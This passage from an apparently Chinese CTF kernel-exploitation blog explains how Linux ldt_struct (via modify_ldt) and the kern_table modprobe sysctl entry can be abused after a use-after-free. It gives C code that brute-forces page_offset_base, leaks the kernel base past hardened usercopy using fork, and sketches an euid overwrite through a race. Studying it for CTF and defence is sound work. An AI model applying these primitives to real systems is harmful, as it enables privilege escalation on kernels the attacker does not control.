(info-&gt;base_addr &amp; 0x0000ffff);</span></span><br><span class="line"><span class="comment">	desc-&gt;base1		= (info-&gt;base_addr &amp; 0x00ff0000) &gt;&gt; 16;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;type		= (info-&gt;read_exec_only ^ 1) &lt;&lt; 1;</span></span><br><span class="line"><span class="comment">	desc-&gt;type	       |= info-&gt;contents &lt;&lt; 2;</span></span><br><span class="line"><span class="comment">	//Set the ACCESS bit so it can be mapped RO</span></span><br><span class="line"><span class="comment">	desc-&gt;type	       |= 1;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;s			= 1;</span></span><br><span class="line"><span class="comment">	desc-&gt;dpl		= 0x3;</span></span><br><span class="line"><span class="comment">	desc-&gt;p			= info-&gt;seg_not_present ^ 1;</span></span><br><span class="line"><span class="comment">	desc-&gt;limit1		= (info-&gt;limit &amp; 0xf0000) &gt;&gt; 16;</span></span><br><span class="line"><span class="comment">	desc-&gt;avl		= info-&gt;useable;</span></span><br><span class="line"><span class="comment">	desc-&gt;d			= info-&gt;seg_32bit;</span></span><br><span class="line"><span class="comment">	desc-&gt;g			= info-&gt;limit_in_pages;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	desc-&gt;base2		= (info-&gt;base_addr &amp; 0xff000000) &gt;&gt; 24;</span></span><br><span class="line"><span class="comment">	//</span></span><br><span class="line"><span class="comment">	 * Don&#x27;t allow setting of the lm bit. It would confuse</span></span><br><span class="line"><span class="comment">	 * user_64bit_mode and would get overridden by sysret anyway.</span></span><br><span class="line"><span class="comment">	desc-&gt;l			= 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//.......//</span></span><br><span class="line">    <span class="comment">//依据sizeof(ldt_struct)用kmalloc申请chunk作为new_ldt</span></span><br><span class="line">	new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	struct ldt_struct *new_ldt;</span></span><br><span class="line"><span class="comment">	unsigned int alloc_size;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	//.....//</span></span><br><span class="line"><span class="comment">	//依据sizeof(ldt_struct)用kmalloc申请chunk作为new_ldt</span></span><br><span class="line"><span class="comment">	new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL_ACCOUNT);</span></span><br><span class="line"><span class="comment">	//....//</span></span><br><span class="line"><span class="comment">	 </span></span><br><span class="line"><span class="comment">	if (alloc_size &gt; PAGE_SIZE)</span></span><br><span class="line"><span class="comment">		new_ldt-&gt;entries = __vmalloc(alloc_size, GFP_KERNEL_ACCOUNT | __GFP_ZERO);</span></span><br><span class="line"><span class="comment">	else</span></span><br><span class="line"><span class="comment">		new_ldt-&gt;entries = (void *)get_zeroed_page(GFP_KERNEL_ACCOUNT);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if (!new_ldt-&gt;entries) &#123;</span></span><br><span class="line"><span class="comment">		kfree(new_ldt);</span></span><br><span class="line"><span class="comment">		return NULL;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	//The new LDT isn&#x27;t aliased for PTI yet. </span></span><br><span class="line"><span class="comment">	new_ldt-&gt;slot = -1;</span></span><br><span class="line"><span class="comment">	new_ldt-&gt;nr_entries = num_entries;</span></span><br><span class="line"><span class="comment">	return new_ldt;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.......//</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//设置新ldt_struct结构体的entries指针</span></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从ldt结构体中拷贝8个字节到对应位置</span></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//......///</span></span><br><span class="line">    </span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">	unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">	free_ldt_struct(old_ldt);</span><br><span class="line">    <span class="comment">//......//</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>将我们的传入的数据指针<code>ptr</code>，当作一个<code>user_desc</code>结构体拷贝给<code>ldt_info</code></li>
<li>然后依据<code>ldt_info</code>来设置<code>desc_struct</code>结构体<code>ldt</code></li>
<li>之后依据<code>sizeof(ldt_struct)</code>用<code>kmalloc</code>申请<code>chunk</code>作为<code>new_ldt</code></li>
<li>如果存在<code>old_ldt</code>，那么就将<code>old_ldt-&gt;entriesd</code>的数据的拷贝给新的<code>new_ldt-&gt;entries</code></li>
<li>最后将<code>ldt</code>(8个字节)的内容赋值给<code>new_ldt-&gt;entries[ldt_info.entry_number]</code></li>
<li>在退出前还会插入<code>new_ldt</code>并且解开<code>old_ldt</code>，释放<code>old_ldt</code></li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /arch/x86/include/uapi/asm/ldt.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v5.17 /arch/x86/include/asm/desc_defs.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">	u16	limit0;</span><br><span class="line">	u16	base0;</span><br><span class="line">	u16	base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">	u16	limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></div></figure>

<p>比如有个UAF漏洞，我们就可以借助该函数，申请0x10大小的堆块，修改其<code>entries</code>指针，再借助<code>read_ldt</code>函数进行读取</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//......//</span></span><br><span class="line">    <span class="comment">//entries_size肯定大于8192,那么至少可拷贝8192个字节</span></span><br><span class="line">    <span class="comment">//#define LDT_ENTRIES    8192</span></span><br><span class="line">    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">    <span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">		entries_size = bytecount;</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">		retval = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//.....//</span></span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>即获取当前进程中的<code>ldt_struct</code>结构体的<code>entries</code>指针指向的内存，拷贝<code>bytecount</code>个字节给用户</li>
</ul>
<p>那么当如上述所示，借助UAF修改了<code>entries</code>指针之后，就可以进行任意地址读取最少可到达8192个字节的数据。</p>
<p>如果没有地址的话，可以使用爆破的方法来读取内核地址，因为如果没有命中内核空间<code>copy_to_user</code>会返回非0值，但是内核不会崩溃，借助这点特性可以用来爆破内核空间。</p>
<p>但是如果存在<code>harden_usercopy</code>和<code>KASLR</code>，最好还是借助<code>page_offset_base</code>和<code>fork</code>来从线性分配区中搜索数据，不然当<code>copy_to_user</code>的源地址为内核 .text 段（_stext, _etext）时或者线性分配区中的数据较为特殊时会引起<code>kernel panic</code>，致使内核崩溃。</p>
<p>原理就是在<code>fork</code>时最终调用到的是<code>ldt_dup_context</code>函数，该函数有如下操作</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br></pre></td></tr></table></div></figure>

<p>会将父进程的拷贝给子进程，完全在内核中的操作，不会触发<code>hardened usercopy</code>的检查，那么只需要在父进程中设定好搜索的地址之后打开子进程来通过<code>read_ldt()</code>读取数据即可</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_offset;</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"><span class="keyword">size_t</span> searchAddr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//搜索page_offset_base</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myChunk.len = <span class="number">0x8</span>;</span><br><span class="line">    myChunk.idx = <span class="number">0x0</span>;</span><br><span class="line">    myChunk.data = &amp;page_offset_base;<span class="comment">//change the entries</span></span><br><span class="line">    editFun(fd,&amp;myChunk);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);<span class="comment">//read_ldt 8 bytes form entries</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)<span class="comment">//judge yes or no</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//从page_offset_base中搜索内核函数地址</span></span><br><span class="line">searchAddr = page_offset_base;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    myChunk.idx = <span class="number">0x0</span>;</span><br><span class="line">    myChunk.data = &amp;searchAddr</span><br><span class="line">    editFunc(fd, &amp;myChunk);<span class="comment">//修改entries指针</span></span><br><span class="line">    retval = fork();</span><br><span class="line">    <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//读取0x8000数据</span></span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//选取特征数据</span></span><br><span class="line">            <span class="keyword">if</span> ((buf[i] &gt;= <span class="number">0xffffffff81000000</span>)  &amp;&amp; ((buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x030</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                kernel_base = buf[i] -  <span class="number">0x030</span>;</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%p\033[32m\033[1m at \033[0m%p\n&quot;</span>, kernel_base, search_addr);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%p\n&quot;</span>, kernel_offset);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (kernel_base)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    search_addr += <span class="number">0x8000</span>;</span><br><span class="line">&#125;</span><br><span class="line">kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-实现任意地址写"   >
          <a href="#3-实现任意地址写" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-实现任意地址写" class="headerlink" title="(3)实现任意地址写"></a>(3)实现任意地址写</h3>
      <p>同样的还是关于<code>entries</code>指针，如下在<code>write_ldt</code>函数中的代码，<code>entry_number</code>可控，<code>ldt</code>不太可控，那么可以先<code>write_ldt</code>一个<code>new_nr_entries</code>出来，然后再下一次<code>write_ldt</code>就可以给<code>old_nr_entries</code>赋值，进而在<code>memcpy</code>的时候拷贝大量数据。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"><span class="comment">//...//</span></span><br><span class="line"><span class="comment">//设置新ldt_struct结构体的entries指针</span></span><br><span class="line"> <span class="comment">//#define LDT_ENTRY_SIZE    8</span></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//从ldt结构体中拷贝8个字节到对应位置</span></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></div></figure>

<p>而如果这时有个条件竞争，在拷贝过程中将<code>new_ldt-&gt;entries</code>给劫持了，那么就可以借助拷贝之后的语句<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>来依据<code>ldt</code>修改劫持之后的<code>new_ldt-&gt;entries</code>对应内存。</p>
<p>不过需要注意的是，虽然可以修改，但是其实<code>ldt</code>由于之前提到的设置原因，其数据会有所改变，不太能随意可控，但是如果可以设置4个字节的0数据，那就可以设置当前进程的euid了，这样也能提权，但是还没接触到怎么通过euid设置来提权。</p>
<p>但是<code>arttnba3</code>师傅写的用来修改euid之后调用<code>seteuid</code>的方法好使，不太清楚为什么，这个方法需要的数据不用太严苛吗?不太清楚哎。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">desc.base_addr = <span class="number">0</span>;</span><br><span class="line">desc.entry_number = <span class="number">2</span>;</span><br><span class="line">desc.limit = <span class="number">0</span>;</span><br><span class="line">desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">desc.contents = <span class="number">0</span> ;</span><br><span class="line">desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">desc.lm = <span class="number">0</span>;</span><br><span class="line">desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">desc.useable = <span class="number">0</span>;</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br></pre></td></tr></table></div></figure>




        <h2 id="5-kern-table数组"   >
          <a href="#5-kern-table数组" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-kern-table数组" class="headerlink" title="5.kern_table数组"></a>5.kern_table数组</h2>
      
        <h3 id="前置知识-1"   >
          <a href="#前置知识-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3>
      <p>这个不能叫结构体吧，不过这个可以利用</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17  /kernel/sysctl.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> <span class="title">kern_table</span>[] =</span> &#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">    &#123;</span><br><span class="line">        .procname	= <span class="string">&quot;modprobe&quot;</span>,</span><br><span class="line">        .data		= &amp;modprobe_path,</span><br><span class="line">        .maxlen		= KMOD_PATH_LEN,</span><br><span class="line">        .mode		= <span class="number">0644</span>,</span><br><span class="line">        .proc_handler	= proc_dostring,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        .procname	= <span class="string">&quot;modules_disabled&quot;</span>,</span><br><span class="line">        .data		= &amp;modules_disabled,</span><br><span class="line">        .maxlen		= <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .mode		= <span class="number">0644</span>,</span><br><span class="line">        <span class="comment">/* only handle a transition from default &quot;0&quot; to &quot;1&quot; */</span></span><br><span class="line">        .proc_handler	= proc_dointvec_minmax,</span><br><span class="line">        .extra1		= SYSCTL_ONE,</span><br><span class="line">        .extra2		= SYSCTL_ONE,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>其中包含很多<code>/proc/sys/kernel/</code>下的文件句柄，这些是在linux内核启动时就进行映射的，和文件相关一一对应，如果我们能修改这些句柄，比如将<code>data</code>指针修改到任意位置，当我们打开<code>/proc/sys/kernel/</code>下对应的文件时，就能依据<code>data</code>指针，读取到该指针对应的数据。</p>
<p>而我们主要就是利用其中的<code>CONFIG_MODULES</code>定义下的<code>modprobe</code>，也就是以前提权经常用到的<code>modprobe_path</code>，可以看到，<code>modeprobe</code>这个文件映射句柄其中保存着<code>modprobe_path</code>这个全局变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281410940.png" alt="image-20220328141017757"></p>
<p>内存分布如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281412927.png" alt="image-20220328141220790"></p>

        <h3 id="实现任意读取"   >
          <a href="#实现任意读取" class="heading-link"><i class="fas fa-link"></i></a><a href="#实现任意读取" class="headerlink" title="实现任意读取"></a>实现任意读取</h3>
      
        <h4 id="内存映射"   >
          <a href="#内存映射" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h4>
      <p>除了上述的启动内核时发生映射外，当我们运行程序时，也会在内核的线性分配区<code>page_offset_base</code>即<code>0xffff888000000000</code>发生映射，比如如下的v5.6版本下的内核，没开启KASLR的情况下映射偏移为<code>0x2444100</code>如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281706047.png" alt="image-20220328170627765"></p>
<p>可以看到数据完全一致，而由于是映射关系，当我们修改其中一部分的数据时，另一部分数据也会发生变化，尝试修改<code>data</code>指针为<code>0xffffffff82446ab0</code>，两边都发生了变化。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281710474.png" alt="image-20220328171003365"></p>

        <h4 id="内存复制"   >
          <a href="#内存复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存复制" class="headerlink" title="内存复制"></a>内存复制</h4>
      <p>除了内存映射区域之外，还有一个内存复制区域，也是在<code>page_offset_base</code>上，比如这里的偏移为<code>0xec8a440</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281721303.png" alt="image-20220328172112145"></p>
<p>可以看到完全一样的，但是由于是复制的关系，所以不存在映射关系，所以我们可以将内存映射的<code>modprobe</code>的<code>data</code>指针指向内存复制的<code>modprobe</code>的<code>data</code>指针，打开<code>/proc/sys/kernel/modprobe</code>文件即可获取到内存复制区域的<code>modprobe</code>的<code>data</code>指针数据，即<code>modprobe_path</code>的地址，这样我们就可以在只有堆地址和任意写的时候，不泄露内核基地址的情况下，完成<code>modprobe_path</code>的地址泄露。</p>

        <h4 id="KASLR"   >
          <a href="#KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4>
      <p>如果开启了<code>KASLR</code>的话，就有点不同了，由于是文件内存映射和复制的关系，所以这个映射和复制的偏移量其实比较取决于文件系统和内核版本，内核的文件系统比较复杂，VFS接口下可连接一堆的文件系统，每个文件系统又都有点不一样，所以一般都需要实际分析，以下是我的测试结果</p>

        <h5 id="SVR4"   >
          <a href="#SVR4" class="heading-link"><i class="fas fa-link"></i></a><a href="#SVR4" class="headerlink" title="SVR4"></a>SVR4</h5>
      <p>这个文件系统也就是我们kernel题中常见的cpio后缀使用的，没有开启KASLR的时候，映射和复制的偏移都是确定的，实际调一下，借用peda插件的find功能可以容易搜索到。但是开启之后，复制的偏移基本不会变化，但是映射的偏移会发生变化，测试多次如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v5.6</span><br><span class="line">#modprobe_map 0x2444100</span><br><span class="line">#modprobe_map 0x6844100</span><br><span class="line">#modprobe_map 0x6c44100</span><br><span class="line">#modprobe_map 0xd244100</span><br><span class="line">#modprobe_map 0x5844100</span><br><span class="line"></span><br><span class="line">#modprobe_copy 0xec8a440</span><br></pre></td></tr></table></div></figure>

<p>但是观察也可以看到，其实偏移发生的话，相对于映射区域，只有一个字节发生改变，那么我们就可以尝试爆破这一个字节来获取。</p>

        <h5 id="ext4"   >
          <a href="#ext4" class="heading-link"><i class="fas fa-link"></i></a><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h5>
      <p>这个文件系统的也比较常见，不过比较好的一点就是，实际测试结果发现映射和复制的偏移在开启KASLR之后都不会发生改变，所以测出来就可以直接使用了。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v5.15.26</span><br><span class="line">#modprobe_map 0x3502530</span><br><span class="line">#modprobe_copy 0x264e608</span><br></pre></td></tr></table></div></figure>

<p>这个主要是最近的LINECTF上的encrypt这个内核题事后看WP出来的，忘记哪位师傅了。</p>

        <h3 id="其他猜想"   >
          <a href="#其他猜想" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他猜想" class="headerlink" title="其他猜想"></a>其他猜想</h3>
      <p>之前的<code>kern_table</code>的结构可以看到，每个文件都有<code>.mode</code>属性，这个属性其实就是该文件的权限属性，也就是我们输入<code>ls -al file</code>出来的相关权限</p>
